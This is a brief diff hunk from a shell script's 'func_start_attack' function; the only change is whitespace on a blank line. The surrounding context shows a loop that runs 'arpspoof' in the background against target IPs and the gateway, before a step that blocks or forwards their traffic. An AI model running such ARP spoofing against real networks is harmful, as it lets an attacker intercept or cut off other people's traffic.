@@ -448,7 +448,7 @@ func_start_attack()
         echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Spoofing target: ${CGrn}$IP${CClr}"
         arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
     done
-
+ 
     # Block or forward internet access
     if [[ $FORWARD_TRAFFIC == true ]]
     then
